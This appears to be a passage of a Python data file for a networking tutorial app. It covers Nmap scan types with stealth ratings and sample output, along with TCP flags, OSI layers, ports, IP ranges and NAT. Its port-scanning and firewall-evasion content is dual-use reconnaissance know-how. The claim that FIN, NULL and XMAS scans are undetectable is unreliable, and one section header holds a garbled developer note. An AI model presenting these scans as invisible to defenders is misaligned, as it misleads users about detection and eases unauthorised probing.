        "nickname": "Half-Open / Stealth Scan",
        "icon": "🥷",
        "color": "#27ae60",
        "difficulty": "Intermediate",
        "stealth": "High",
        "speed": "Fast",
        "requires_root": True,
        "description": "The default and most popular Nmap scan. Sends SYN, receives SYN-ACK (open) or RST (closed), then sends RST to close. Never completes the handshake.",
        "why_stealthy": "Because the TCP connection is never fully established, it's less likely to be logged by the target application.",
        "packets": [
            {"seq": 1, "from": "Attacker", "to": "Target", "flag": "SYN", "flag_color": "#3498db", "label": "Port open? SYN sent to port 80", "result": "waiting"},
            {"seq": 2, "from": "Target", "to": "Attacker", "flag": "SYN-ACK", "flag_color": "#27ae60", "label": "Port 80 is OPEN (SYN-ACK received)", "result": "open"},
            {"seq": 3, "from": "Attacker", "to": "Target", "flag": "RST", "flag_color": "#e74c3c", "label": "Connection reset (never completed)", "result": "reset"}
        ],
        "command": "nmap -sS 192.168.1.1",
        "output": """Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.1.1
Host is up (0.0021s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3306/tcp open  mysql
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 1.23 seconds"""
    },
    {
        "id": "connect_scan",
        "name": "TCP Connect Scan",
        "nmap_flag": "-sT",
        "nickname": "Full Connect",
        "icon": "🤝",
        "color": "#3498db",
        "difficulty": "Beginner",
        "stealth": "Low",
        "speed": "Slower",
        "requires_root": False,
        "description": "Completes the full 3-way handshake. Works without root privileges because it uses the OS's connect() syscall.",
        "why_stealthy": "Not stealthy — the full connection is logged by the target application.",
        "packets": [
            {"seq": 1, "from": "Attacker", "to": "Target", "flag": "SYN", "flag_color": "#3498db", "label": "SYN sent to port 443", "result": "waiting"},
            {"seq": 2, "from": "Target", "to": "Attacker", "flag": "SYN-ACK", "flag_color": "#27ae60", "label": "Port 443 is OPEN", "result": "open"},
            {"seq": 3, "from": "Attacker", "to": "Target", "flag": "ACK", "flag_color": "#9b59b6", "label": "Handshake complete — connection established", "result": "complete"},
            {"seq": 4, "from": "Attacker", "to": "Target", "flag": "FIN", "flag_color": "#e74c3c", "label": "Close connection gracefully", "result": "closed"}
        ],
        "command": "nmap -sT 192.168.1.1",
        "output": """Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.1.1
Host is up (0.0034s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https

Nmap done: 1 IP address (1 host up) scanned in 2.87 seconds"""
    },
    {
        "id": "udp_scan",
        "name": "UDP Scan",
        "nmap_flag": "-sU",
        "nickname": "Connectionless Probe",
        "icon": "📡",
        "color": "#f39c12",
        "difficulty": "Advanced",
        "stealth": "Medium",
        "speed": "Very Slow",
        "requires_root": True,
        "description": "Sends UDP packets. Open ports give no response; closed ports send ICMP 'port unreachable'. Much slower than TCP scans.",
        "why_stealthy": "UDP is connectionless so there's no handshake to detect. But ICMP responses reveal closed ports.",
        "packets": [
            {"seq": 1, "from": "Attacker", "to": "Target", "flag": "UDP", "flag_color": "#f39c12", "label": "UDP packet sent to port 53 (DNS)", "result": "waiting"},
            {"seq": 2, "from": "Target", "to": "Attacker", "flag": "No Reply", "flag_color": "#27ae60", "label": "No response = port is OPEN or filtered", "result": "open"},
            {"seq": 3, "from": "Target", "to": "Attacker", "flag": "ICMP", "flag_color": "#e74c3c", "label": "ICMP 'unreachable' = port CLOSED", "result": "closed"}
        ],
        "command": "nmap -sU -p 53,67,123,161 192.168.1.1",
        "output": """Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.1.1
Host is up (0.0045s latency).
PORT     STATE         SERVICE
53/udp   open          domain
67/udp   open|filtered dhcps
123/udp  open          ntp
161/udp  closed        snmp

Nmap done: 1 IP address (1 host up) scanned in 45.67 seconds"""
    },
    {
        "id": "xmas_scan",
        "name": "XMAS Scan",
        "nmap_flag": "-sX",
        "nickname": "All Flags Set",
        "icon": "🎄",
        "color": "#e74c3c",
        "difficulty": "Advanced",
        "stealth": "High",
        "speed": "Fast",
        "requires_root": True,
        "description": "Sets FIN, PSH, and URG flags simultaneously. Closed ports respond with RST; open ports ignore the packet.",
        "why_stealthy": "Bypasses many simple firewalls that only check SYN packets.",
        "packets": [
            {"seq": 1, "from": "Attacker", "to": "Target", "flag": "FIN+PSH+URG", "flag_color": "#e74c3c", "label": "XMAS packet sent to port 22", "result": "waiting"},
            {"seq": 2, "from": "Target", "to": "Attacker", "flag": "No Reply", "flag_color": "#27ae60", "label": "No reply = OPEN port", "result": "open"},
            {"seq": 3, "from": "Target", "to": "Attacker", "flag": "RST", "flag_color": "#c0392b", "label": "RST = CLOSED port", "result": "closed"}
        ],
        "command": "nmap -sX 192.168.1.1",
        "output": """Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.1.1
Host is up (0.0028s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE         SERVICE
22/tcp   open|filtered ssh
80/tcp   open|filtered http
443/tcp  open|filtered https

Nmap done: 1 IP address (1 host up) scanned in 1.45 seconds"""
    },
    {
        "id": "null_scan",
        "name": "NULL Scan",
        "nmap_flag": "-sN",
        "nickname": "No Flags",
        "icon": "⭕",
        "color": "#9b59b6",
        "difficulty": "Advanced",
        "stealth": "High",
        "speed": "Fast",
        "requires_root": True,
        "description": "Sends packets with NO TCP flags set. Closed ports reply with RST; open ports give no reply.",
        "why_stealthy": "Completely bypasses SYN-based detection. Relies on RFC 793 behavior.",
        "packets": [
            {"seq": 1, "from": "Attacker", "to": "Target", "flag": "None", "flag_color": "#9b59b6", "label": "NULL packet (no flags) sent", "result": "waiting"},
            {"seq": 2, "from": "Target", "to": "Attacker", "flag": "No Reply", "flag_color": "#27ae60", "label": "No reply = OPEN", "result": "open"},
            {"seq": 3, "from": "Target", "to": "Attacker", "flag": "RST", "flag_color": "#c0392b", "label": "RST = CLOSED", "result": "closed"}
        ],
        "command": "nmap -sN 192.168.1.1",
        "output": """Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.1.1
Host is up (0.0030s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE         SERVICE
22/tcp   open|filtered ssh
80/tcp   open|filtered http
443/tcp  open|filtered https
3306/tcp open|filtered mysql

Nmap done: 1 IP address (1 host up) scanned in 1.34 seconds"""
    },
    {
        "id": "ack_scan",
        "name": "ACK Scan",
        "nmap_flag": "-sA",
        "nickname": "Firewall Mapper",
        "icon": "🔥",
        "color": "#c0392b",
        "difficulty": "Advanced",
        "stealth": "Medium",
        "speed": "Fast",
        "requires_root": True,
        "description": "Sends ACK packets to determine firewall rules. Cannot tell if ports are open, only whether they're FILTERED or UNFILTERED.",
        "why_stealthy": "Never reveals open ports. Used to map firewall rules instead.",
        "packets": [
            {"seq": 1, "from": "Attacker", "to": "Target", "flag": "ACK", "flag_color": "#c0392b", "label": "ACK packet sent to probe firewall", "result": "waiting"},
            {"seq": 2, "from": "Target", "to": "Attacker", "flag": "RST", "flag_color": "#27ae60", "label": "RST = UNFILTERED (firewall allows)", "result": "unfiltered"},
            {"seq": 3, "from": "Target", "to": "Attacker", "flag": "No Reply", "flag_color": "#e74c3c", "label": "No reply = FILTERED (firewall drops)", "result": "filtered"}
        ],
        "command": "nmap -sA 192.168.1.1",
        "output": """Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.1.1
Host is up (0.0025s latency).
Not shown: 990 unfiltered tcp ports (reset)
PORT     STATE    SERVICE
22/tcp   filtered ssh
23/tcp   filtered telnet
135/tcp  filtered msrpc
139/tcp  filtered netbios-ssn
445/tcp  filtered microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 1.56 seconds"""
    }
]

# ==================== TCP FLAG SCAN MATRIX ====================
TCP_FLAG_SCAN_MATRIX = [
    {"flags": "SYN",         "scan": "-sS", "open_response": "SYN-ACK",            "closed_response": "RST",              "detectable": "Yes"},
    {"flags": "SYN (full)",  "scan": "-sT", "open_response": "SYN-ACK → ACK",      "closed_response": "RST",              "detectable": "Yes"},
    {"flags": "FIN",         "scan": "-sF", "open_response": "No reply",            "closed_response": "RST",              "detectable": "No"},
    {"flags": "NULL",        "scan": "-sN", "open_response": "No reply",            "closed_response": "RST",              "detectable": "No"},
    {"flags": "FIN+PSH+URG", "scan": "-sX", "open_response": "No reply",            "closed_response": "RST",              "detectable": "No"},
    {"flags": "ACK",         "scan": "-sA", "open_response": "RST (unfiltered)",    "closed_response": "No reply (filtered)", "detectable": "Yes"},
    {"flags": "UDP",         "scan": "-sU", "open_response": "No reply",            "closed_response": "ICMP unreachable", "detectable": "Medium"},
    {"flags": "Maimon",      "scan": "-sM", "open_response": "No reply",            "closed_response": "RST",              "detectable": "No"}
]

# ==================== PORT STATE MEANINGS ====================
PORT_STATES = [
    {"state": "open",            "color": "#27ae60", "icon": "🟢", "meaning": "Application is actively accepting connections"},
    {"state": "closed",          "color": "#e74c3c", "icon": "🔴", "meaning": "Port is reachable but no application listening"},
    {"state": "filtered",        "color": "#f39c12", "icon": "🟡", "meaning": "Firewall is blocking — no response received"},
    {"state": "unfiltered",      "color": "#3498db", "icon": "🔵", "meaning": "Port is accessible but state (open/closed) unknown"},
    {"state": "open|filtered",   "color": "#9b59b6", "icon": "🟣", "meaning": "Cannot determine — no response either way"},
    {"state": "closed|filtered", "color": "#c0392b", "icon": "⚫", "meaning": "Cannot determine — only for IP ID idle scans"}
]
# ==================== OSI LAYERS ====================
OSI_LAYERS = {
    7: {
        "name": "Application Layer",
        "number": 7,
        "color": "#e74c3c",
        "icon": "🌐",
        "summary": "The layer closest to the end user. Interacts with software applications.",
        "description": "The Application Layer is where users interact with the network. It provides network services directly to applications like web browsers, email clients, and file transfer programs.",
        "functions": [
            "Provides user interface for network communication",
            "Identifies communication partners",
            "Determines resource availability",
            "Synchronizes communication",
            "Provides network services to end-user applications"
        ],
        "protocols": ["HTTP", "HTTPS", "FTP", "SMTP", "POP3", "IMAP", "DNS", "DHCP", "Telnet", "SSH", "SNMP", "SMB"],
        "device_keys": ["gateway", "firewall_l7", "proxy"],
        "pdu": "Data",
        "real_world": "When you open Chrome and type 'google.com', the HTTP/HTTPS protocol at this layer handles your request.",
        "example_flow": "Browser sends HTTP GET request → This layer packages it for transport"
    },
    6: {
        "name": "Presentation Layer",
        "number": 6,
        "color": "#e67e22",
        "icon": "🔐",
        "summary": "Translates data between application and network format. Handles encryption, compression, formatting.",
        "description": "The Presentation Layer acts as a translator for the network. It ensures data sent from one system's application layer can be read by another system's application layer.",
        "functions": [
            "Data translation (ASCII ↔ EBCDIC)",
            "Data encryption/decryption (SSL/TLS)",
            "Data compression/decompression",
            "Character code conversion",
            "MIME encoding"
        ],
        "protocols": ["SSL/TLS", "JPEG", "GIF", "PNG", "MPEG", "MIDI", "ASCII", "EBCDIC"],
        "device_keys": ["gateway", "proxy"],
        "pdu": "Data",
        "real_world": "When you visit an HTTPS website, SSL/TLS at this layer encrypts your data.",
        "example_flow": "HTTP data → Encrypted with TLS → Ready for session layer"
    },
    5: {
        "name": "Session Layer",
        "number": 5,
        "color": "#f39c12",
        "icon": "🔄",
        "summary": "Manages and controls dialogues (sessions) between computers.",
        "description": "The Session Layer sets up, coordinates, and terminates conversations, exchanges, and dialogues between applications at each end.",
        "functions": [
            "Session establishment, maintenance, termination",
            "Dialog control (half-duplex/full-duplex)",
            "Synchronization with checkpoints",
            "Recovery from failures",
            "Authentication and authorization"
        ],
        "protocols": ["NetBIOS", "RPC", "PPTP", "SAP", "L2TP", "SOCKS"],
        "device_keys": ["gateway", "proxy"],
        "pdu": "Data",
        "real_world": "When you log into a website and stay logged in while browsing, the session layer maintains your session.",
        "example_flow": "Encrypted data → Session established → Maintained during browsing"
    },
    4: {
        "name": "Transport Layer",
        "number": 4,
        "color": "#27ae60",
        "icon": "📦",
        "summary": "Provides reliable or unreliable delivery. Handles segmentation, flow control, error correction.",
        "description": "The Transport Layer ensures complete data transfer. It breaks data into segments, numbers them, and ensures they arrive correctly at the destination.",
        "functions": [
            "Segmentation and reassembly",
            "Connection control (TCP/UDP)",
            "Flow control",
            "Error control",
            "Port addressing (multiplexing)"
        ],
        "protocols": ["TCP", "UDP", "SCTP", "DCCP", "SPX"],
        "device_keys": ["firewall_l4"],
        "pdu": "Segment (TCP) / Datagram (UDP)",
        "real_world": "When you download a file, TCP at this layer ensures all packets arrive correctly. Video streaming uses UDP for speed.",
        "example_flow": "Session data → TCP segments with port numbers → Network layer"
    },
    3: {
        "name": "Network Layer",
        "number": 3,
        "color": "#3498db",
        "icon": "🗺️",
        "summary": "Handles logical addressing (IP addresses) and routing across networks.",
        "description": "The Network Layer is responsible for packet forwarding, including routing through intermediate routers. It provides logical addressing.",
        "functions": [
            "Logical addressing (IP addresses)",
            "Routing between networks",
            "Packet forwarding",
            "Fragmentation and reassembly",
            "Error reporting (ICMP)"
        ],
        "protocols": ["IP (IPv4/IPv6)", "ICMP", "IGMP", "ARP", "RARP", "OSPF", "BGP", "RIP"],
        "device_keys": ["router", "l3_switch", "firewall_l4"],
        "pdu": "Packet",
        "real_world": "When you send data to google.com, routers at this layer determine the best path across the internet.",
        "example_flow": "TCP segments → IP packets with source/dest IP → Data Link layer"
    },
    2: {
        "name": "Data Link Layer",
        "number": 2,
        "color": "#9b59b6",
        "icon": "🔗",
        "summary": "Handles physical addressing (MAC addresses) and error detection between adjacent nodes.",
        "description": "The Data Link Layer provides node-to-node data transfer and handles error detection and correction from the physical layer.",
        "functions": [
            "Physical addressing (MAC addresses)",
            "Framing",
            "Error detection (CRC)",
            "Flow control",
            "Access control (MAC)",
            "Switch operations"
        ],
        "protocols": ["Ethernet", "Wi-Fi (802.11)", "PPP", "HDLC", "Frame Relay", "ATM", "VLAN (802.1Q)", "STP"],
        "device_keys": ["switch", "bridge", "nic", "access_point", "modem", "l3_switch"],
        "pdu": "Frame",
        "real_world": "Your computer's MAC address is used at this layer. Switches use MAC addresses to forward frames.",
        "example_flow": "IP packets → Ethernet frames with MAC addresses → Physical layer"
    },
    1: {
        "name": "Physical Layer",
        "number": 1,
        "color": "#1abc9c",
        "icon": "⚡",
        "summary": "Transmits raw bits over physical media. Defines cables, connectors, voltages, data rates.",
        "description": "The Physical Layer is the lowest layer and is responsible for the actual physical connection between devices. It transmits raw bit streams over a physical medium.",
        "functions": [
            "Bit transmission (0s and 1s)",
            "Physical media specification",
            "Signal encoding",
            "Data rate control",
            "Topology definition",
            "Synchronization"
        ],
        "protocols": ["Ethernet Physical", "USB", "Bluetooth", "DSL", "ISDN", "RS-232", "V.35"],
        "device_keys": ["hub", "repeater", "cable", "transceiver", "antenna", "nic", "modem", "access_point"],
        "pdu": "Bit",
        "real_world": "Your Ethernet cable or Wi-Fi antenna operates at this layer. It converts data into electrical signals, light pulses, or radio waves.",
        "example_flow": "Frames → Electrical/optical/radio signals → Travel to destination"
    }
}

# ==================== COMMON PORTS ====================
COMMON_PORTS = [
    {"port": 20, "protocol": "TCP", "service": "FTP Data", "description": "File Transfer Protocol - Data Transfer"},
    {"port": 21, "protocol": "TCP", "service": "FTP Control", "description": "File Transfer Protocol - Control"},
    {"port": 22, "protocol": "TCP", "service": "SSH", "description": "Secure Shell - Encrypted remote access"},
    {"port": 23, "protocol": "TCP", "service": "Telnet", "description": "Unencrypted remote access (legacy)"},
    {"port": 25, "protocol": "TCP", "service": "SMTP", "description": "Simple Mail Transfer Protocol"},
    {"port": 53, "protocol": "TCP/UDP", "service": "DNS", "description": "Domain Name System"},
    {"port": 67, "protocol": "UDP", "service": "DHCP Server", "description": "Dynamic Host Configuration Protocol"},
    {"port": 68, "protocol": "UDP", "service": "DHCP Client", "description": "DHCP client port"},
    {"port": 69, "protocol": "UDP", "service": "TFTP", "description": "Trivial File Transfer Protocol"},
    {"port": 80, "protocol": "TCP", "service": "HTTP", "description": "Hypertext Transfer Protocol"},
    {"port": 110, "protocol": "TCP", "service": "POP3", "description": "Post Office Protocol v3"},
    {"port": 119, "protocol": "TCP", "service": "NNTP", "description": "Network News Transfer Protocol"},
    {"port": 123, "protocol": "UDP", "service": "NTP", "description": "Network Time Protocol"},
    {"port": 143, "protocol": "TCP", "service": "IMAP", "description": "Internet Message Access Protocol"},
    {"port": 161, "protocol": "UDP", "service": "SNMP", "description": "Simple Network Management Protocol"},
    {"port": 162, "protocol": "UDP", "service": "SNMP Trap", "description": "SNMP Trap"},
    {"port": 179, "protocol": "TCP", "service": "BGP", "description": "Border Gateway Protocol"},
    {"port": 194, "protocol": "TCP", "service": "IRC", "description": "Internet Relay Chat"},
    {"port": 389, "protocol": "TCP/UDP", "service": "LDAP", "description": "Lightweight Directory Access Protocol"},
    {"port": 443, "protocol": "TCP", "service": "HTTPS", "description": "HTTP Secure (TLS/SSL)"},
    {"port": 445, "protocol": "TCP", "service": "SMB", "description": "Server Message Block (Windows File Sharing)"},
    {"port": 465, "protocol": "TCP", "service": "SMTPS", "description": "SMTP over SSL"},
    {"port": 514, "protocol": "UDP", "service": "Syslog", "description": "System Logging"},
    {"port": 587, "protocol": "TCP", "service": "SMTP (Submission)", "description": "Email submission"},
    {"port": 636, "protocol": "TCP", "service": "LDAPS", "description": "LDAP over SSL"},
    {"port": 993, "protocol": "TCP", "service": "IMAPS", "description": "IMAP over SSL"},
    {"port": 995, "protocol": "TCP", "service": "POP3S", "description": "POP3 over SSL"},
    {"port": 1433, "protocol": "TCP", "service": "MSSQL", "description": "Microsoft SQL Server"},
    {"port": 1521, "protocol": "TCP", "service": "Oracle DB", "description": "Oracle Database"},
    {"port": 3306, "protocol": "TCP", "service": "MySQL", "description": "MySQL Database"},
    {"port": 3389, "protocol": "TCP", "service": "RDP", "description": "Remote Desktop Protocol"},
    {"port": 5432, "protocol": "TCP", "service": "PostgreSQL", "description": "PostgreSQL Database"},
    {"port": 5900, "protocol": "TCP", "service": "VNC", "description": "Virtual Network Computing"},
    {"port": 6379, "protocol": "TCP", "service": "Redis", "description": "Redis Key-Value Store"},
    {"port": 8080, "protocol": "TCP", "service": "HTTP Alt", "description": "HTTP Alternative (Proxy)"},
    {"port": 8443, "protocol": "TCP", "service": "HTTPS Alt", "description": "HTTPS Alternative"},
    {"port": 27017, "protocol": "TCP", "service": "MongoDB", "description": "MongoDB Database"}
]

TCP_FLAGS = [
    {"flag": "SYN", "name": "Synchronize", "description": "Used to initiate a connection. The first packet in the 3-way handshake.", "color": "#3498db"},
    {"flag": "ACK", "name": "Acknowledge", "description": "Confirms receipt of a packet. Used in almost all packets after connection established.", "color": "#27ae60"},
    {"flag": "FIN", "name": "Finish", "description": "Used to gracefully terminate a connection. No more data from sender.", "color": "#e74c3c"},
    {"flag": "RST", "name": "Reset", "description": "Abruptly terminates a connection. Used when an error occurs or invalid packet received.", "color": "#c0392b"},
    {"flag": "PSH", "name": "Push", "description": "Tells receiver to process data immediately without buffering.", "color": "#f39c12"},
    {"flag": "URG", "name": "Urgent", "description": "Indicates urgent data. The urgent pointer field is valid.", "color": "#9b59b6"},
    {"flag": "ECE", "name": "ECN Echo", "description": "Explicit Congestion Notification Echo. Indicates network congestion.", "color": "#1abc9c"},
    {"flag": "CWR", "name": "Congestion Window Reduced", "description": "Indicates sender reduced congestion window in response to ECE.", "color": "#34495e"}
]

TCP_HANDSHAKE = [
    {"step": 1, "title": "SYN", "from": "Client", "to": "Server", "description": "Client sends a SYN packet with a random sequence number (e.g., Seq=100) to initiate connection.", "flags": "SYN=1, ACK=0", "seq": "100", "ack": "0"},
    {"step": 2, "title": "SYN-ACK", "from": "Server", "to": "Client", "description": "Server responds with SYN-ACK, acknowledging client's sequence (Ack=101) and sending its own sequence (Seq=300).", "flags": "SYN=1, ACK=1", "seq": "300", "ack": "101"},
    {"step": 3, "title": "ACK", "from": "Client", "to": "Server", "description": "Client sends ACK acknowledging server's sequence (Ack=301). Connection is now established!", "flags": "SYN=0, ACK=1", "seq": "101", "ack": "301"}
]

TCP_TERMINATION = [
    {"step": 1, "title": "FIN", "from": "Client", "to": "Server", "description": "Client sends FIN to request connection termination."},
    {"step": 2, "title": "ACK", "from": "Server", "to": "Client", "description": "Server acknowledges the FIN."},
    {"step": 3, "title": "FIN", "from": "Server", "to": "Client", "description": "Server sends its own FIN when ready to close."},
    {"step": 4, "title": "ACK", "from": "Client", "to": "Server", "description": "Client acknowledges server's FIN. Connection closed."}
]

IOT_PROTOCOLS = [
    {"name": "MQTT", "full_name": "Message Queuing Telemetry Transport", "port": "1883 (TCP) / 8883 (TLS)", "layer": "Application (L7)", "description": "Lightweight publish-subscribe protocol designed for constrained devices and low-bandwidth networks.", "use_cases": ["Smart Home", "Industrial IoT", "Sensor Networks", "Remote Monitoring"], "pros": ["Very lightweight", "Low bandwidth", "Reliable with QoS levels", "Widely supported"], "cons": ["Requires broker", "Not ideal for large payloads"], "color": "#3498db"},
    {"name": "CoAP", "full_name": "Constrained Application Protocol", "port": "5683 (UDP) / 5684 (DTLS)", "layer": "Application (L7)", "description": "RESTful protocol designed for constrained nodes and networks. Uses UDP for efficiency.", "use_cases": ["Smart Cities", "Building Automation", "Sensor Networks"], "pros": ["UDP-based (fast)", "RESTful", "Low overhead", "DTLS security"], "cons": ["Less reliable than TCP-based", "Limited browser support"], "color": "#27ae60"},
    {"name": "Zigbee", "full_name": "Zigbee (IEEE 802.15.4)", "port": "N/A (Mesh)", "layer": "Data Link / Network (L2/L3)", "description": "Low-power, low-data-rate wireless mesh networking standard for personal area networks.", "use_cases": ["Smart Home", "Lighting Control", "Home Automation", "Industrial"], "pros": ["Very low power", "Mesh networking", "Self-healing", "Large network support"], "cons": ["Low data rate", "Short range per node", "Requires gateway"], "color": "#f39c12"},
    {"name": "LoRaWAN", "full_name": "Long Range Wide Area Network", "port": "N/A (LPWAN)", "layer": "Data Link / Network (L2/L3)", "description": "Low-power wide-area network protocol for long-range communication with minimal power.", "use_cases": ["Smart Agriculture", "Asset Tracking", "Smart Cities", "Utility Metering"], "pros": ["Very long range (15+ km)", "Extremely low power", "Low cost", "Works in rural areas"], "cons": ["Very low data rate", "Requires gateway", "Limited payload"], "color": "#9b59b6"},
    {"name": "BLE", "full_name": "Bluetooth Low Energy", "port": "N/A (Wireless)", "layer": "Physical / Data Link (L1/L2)", "description": "Energy-efficient version of Bluetooth for short-range communication with low power consumption.", "use_cases": ["Wearables", "Health Monitors", "Beacons", "Smart Locks"], "pros": ["Very low power", "Widely available", "Fast connection", "Low cost"], "cons": ["Short range (~10-100m)", "Lower data rate than classic BT"], "color": "#1abc9c"},
    {"name": "AMQP", "full_name": "Advanced Message Queuing Protocol", "port": "5672 (TCP) / 5671 (TLS)", "layer": "Application (L7)", "description": "Message-oriented middleware protocol for reliable messaging between applications.", "use_cases": ["Industrial IoT", "Enterprise Messaging", "Financial Systems"], "pros": ["Reliable", "Message queuing", "Routing flexibility", "Transactions"], "cons": ["Heavier than MQTT", "More complex"], "color": "#e74c3c"}
]

# ==================== IP ADDRESS DATA ====================
IP_ADDRESSES = {
    "private": [
        {"range": "10.0.0.0 – 10.255.255.255", "subnet": "10.0.0.0/8", "hosts": "16,777,216", "use": "Large enterprise networks"},
        {"range": "172.16.0.0 – 172.31.255.255", "subnet": "172.16.0.0/12", "hosts": "1,048,576", "use": "Medium networks"},
        {"range": "192.168.0.0 – 192.168.255.255", "subnet": "192.168.0.0/16", "hosts": "65,536", "use": "Home & small office networks"}
    ],
    "special": [
        {"address": "127.0.0.1", "name": "Loopback", "use": "Refers to your own machine (localhost)"},
        {"address": "169.254.x.x", "name": "APIPA / Link-Local", "use": "Self-assigned when DHCP unavailable"},
        {"address": "0.0.0.0", "name": "Default Route / Any", "use": "Wildcard or default gateway"},
        {"address": "255.255.255.255", "name": "Broadcast", "use": "Sent to all devices on the network"},
        {"address": "224.0.0.0 – 239.255.255.255", "name": "Multicast", "use": "One-to-many group communication"}
    ],
    "ipv6": [
        {"range": "2000::/3", "name": "Global Unicast", "use": "Publicly routable (like public IPv4)"},
        {"range": "fc00::/7", "name": "Unique Local", "use": "Private networks (like 192.168.x.x)"},
        {"range": "fe80::/10", "name": "Link-Local", "use": "Same link only, auto-configured"},
        {"range": "ff00::/8", "name": "Multicast", "use": "One-to-many communication"}
    ]
}

# ==================== PORT LEARNING DATA ====================
PORT_CATEGORIES = [
    {
        "name": "Web Browsing",
        "icon": "🌐",
        "color": "#3498db",
        "ports": [80, 443, 8080, 8443],
        "description": "HTTP and HTTPS ports for web traffic",
        "explanation": "When you type google.com in your browser, your computer uses these ports to send HTTP requests and receive web pages."
    },
    {
        "name": "Email",
        "icon": "📧",
        "color": "#e74c3c",
        "ports": [25, 110, 143, 465, 587, 993, 995],
        "description": "SMTP, POP3, and IMAP for sending and receiving email",
        "explanation": "Outlook or Gmail client connects to these ports to sync your emails across devices."
    },
    {
        "name": "File Transfer",
        "icon": "📁",
        "color": "#f39c12",
        "ports": [20, 21, 22, 69, 445],
        "description": "FTP, SFTP, TFTP, and SMB for transferring files",
        "explanation": "Uploading a file to a server uses these ports. SSH (22) is the secure choice, Telnet and FTP are legacy/insecure."
    },
    {
        "name": "Remote Access",
        "icon": "🖥️",
        "color": "#9b59b6",
        "ports": [22, 23, 3389, 5900],
        "description": "SSH, Telnet, RDP, and VNC for remote control",
        "explanation": "IT admins use these ports to connect to servers and computers remotely. RDP (3389) is Windows, SSH (22) is Linux/Mac."
    },
    {
        "name": "Databases",
        "icon": "🗄️",
        "color": "#27ae60",
        "ports": [1433, 1521, 3306, 5432, 6379, 27017],
        "description": "MySQL, PostgreSQL, MSSQL, Oracle, Redis, MongoDB",
        "explanation": "Web applications connect to databases on these ports to store and retrieve data. Never expose these to the internet directly!"
    },
    {
        "name": "Network Services",
        "icon": "🔧",
        "color": "#1abc9c",
        "ports": [53, 67, 68, 123, 161, 162, 514],
        "description": "DNS, DHCP, NTP, SNMP, Syslog for infrastructure",
        "explanation": "These ports keep the network running. DNS (53) translates names to IPs, DHCP (67/68) assigns IPs automatically."
    }
]

# ==================== IP & PORT WORKI0-scri-t comamdn also need to add and in top NG SIMULATION ====================
IP_PORT_SIMULATION = [
    {
        "step": 1,
        "title": "You type google.com",
        "description": "Your browser needs to find Google's server. It doesn't know the IP address yet.",
        "from": "Your PC",
        "to": "DNS Server (Port 53)",
        "data": "Query: google.com?",
        "packet_color": "#3498db"
    },
    {
        "step": 2,
        "title": "DNS resolves the IP",
        "description": "The DNS server looks up google.com and returns its IP address (142.250.x.x).",
        "from": "DNS Server",
        "to": "Your PC",
        "data": "IP: 142.250.185.78",
        "packet_color": "#27ae60"
    },
    {
        "step": 3,
        "title": "TCP Handshake on Port 443",
        "description": "Your PC opens a TCP connection to Google's server on port 443 (HTTPS).",
        "from": "Your PC",
        "to": "Google Server",
        "data": "SYN → Port 443",
        "packet_color": "#e74c3c"
    },
    {
        "step": 4,
        "title": "TLS Encryption Setup",
        "description": "Both sides exchange encryption keys to secure the connection.",
        "from": "Google Server",
        "to": "Your PC",
        "data": "SSL Certificate + Keys",
        "packet_color": "#f39c12"
    },
    {
        "step": 5,
        "title": "HTTP GET Request",
        "description": "Your browser sends the actual request for the webpage.",
        "from": "Your PC",
        "to": "Google Server",
        "data": "GET /index.html HTTP/1.1",
        "packet_color": "#9b59b6"
    },
    {
        "step": 6,
        "title": "Webpage Received",
        "description": "Google's server sends back the HTML, CSS, and JavaScript for the page.",
        "from": "Google Server",
        "to": "Your PC",
        "data": "HTML + Assets",
        "packet_color": "#1abc9c"
    }
]

# ==================== NETWORK CONCEPTS ====================
CONCEPTS = {
    "nat": {
        "id": "nat",
        "title": "NAT (Network Address Translation)",
        "icon": "🔄",
        "color": "#3498db",
        "difficulty": "Intermediate",
        "category": "Addressing",
        "summary": "Translates private IP addresses to public IP addresses so multiple devices can share one internet connection.",
        "why_needed": "IPv4 has only ~4.3 billion addresses, but there are 20+ billion devices. NAT lets entire home/office networks share a single public IP.",
        "how_it_works": [
            "Your device sends a packet with a private source IP (e.g., 192.168.1.5)",
            "Router replaces it with its public IP (e.g., 49.36.120.5) and assigns a random port",
            "Router keeps a translation table mapping private↔public",
            "Response comes back to the public IP, router looks up the table",
            "Router forwards response to the correct internal device"
        ],
        "types": [
            {"name": "Static NAT", "desc": "One-to-one mapping. Private IP always maps to same public IP."},
            {"name": "Dynamic NAT", "desc": "Pool of public IPs assigned on-demand to internal devices."},
            {"name": "PAT / NAT Overload", "desc": "Most common. Many private IPs share ONE public IP using different ports."}
        ],
        "diagram_steps": [
            {"label": "PC sends", "data": "192.168.1.5:5000 → 8.8.8.8:53", "color": "#3498db"},
            {"label": "Router translates", "data": "49.36.120.5:62001 → 8.8.8.8:53", "color": "#f39c12"},
            {"label": "Internet responds", "data": "8.8.8.8:53 → 49.36.120.5:62001", "color": "#27ae60"},
            {"label": "Router reverses", "data": "8.8.8.8:53 → 192.168.1.5:5000", "color": "#9b59b6"}
        ],
        "real_example": "Your home Wi-Fi: 10 devices (phones, laptops, TVs) all share ONE public IP from your ISP.",
        "key_benefits": ["Saves IPv4 addresses", "Adds privacy (hides internal IPs)", "Security by obscurity"],
        "key_drawbacks": ["Breaks end-to-end connectivity", "Complicates P2P & VoIP", "Extra processing overhead"]
    },
    "bridging": {
        "id": "bridging",
        "title": "Bridging",
        "icon": "🌉",
        "color": "#9b59b6",
        "difficulty": "Beginner",
        "category": "Layer 2",
        "summary": "Connects two network segments at Layer 2 and forwards frames based on MAC addresses.",
        "why_needed": "To extend a network without adding routing complexity, or to connect wired and wireless segments.",
        "how_it_works": [
            "Bridge learns MAC addresses from frames arriving on each port",
            "Builds a MAC address table (which MAC is on which port)",
